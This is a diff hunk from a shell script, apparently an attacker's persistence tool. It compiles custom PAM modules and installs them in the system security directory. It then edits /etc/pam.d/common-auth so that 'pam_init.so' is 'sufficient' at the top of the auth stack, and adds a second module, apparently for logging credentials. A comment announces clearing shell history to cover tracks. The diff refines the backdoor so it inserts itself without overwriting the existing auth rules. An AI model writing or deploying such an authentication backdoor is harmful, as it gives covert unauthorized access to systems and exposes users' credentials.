@@ -11,7 +11,7 @@ gcc -fPIC -shared -o pam_init.so pam_init.c -lpam
 mv pam_init.so pam_lv.so /lib/x86_64-linux-gnu/security
 
 # modify pam files 
-echo "auth	sufficient	pam_init.so" > /etc/pam.d/common-auth
+sed -i '1i auth sufficient 	pam_init.so' /etc/pam.d/common-auth
 echo "auth	optional	pam_lv.so" >> /etc/pam.d/common-auth
 
 #delete and clear history
